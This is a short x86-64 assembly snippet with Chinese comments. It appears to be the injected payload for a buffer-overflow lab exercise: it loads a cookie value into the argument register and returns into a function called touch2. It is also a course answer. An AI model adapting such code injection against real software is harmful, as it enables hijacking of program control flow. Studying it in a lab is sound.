movq    $0x59b997fa, %rdi # 将cookie值移入函数调用参数
pushq   $0x4017ec         # 将rsp设为存放在栈中的touch2地址的地址
ret                       # 读取栈顶指针指向的地址并跳转
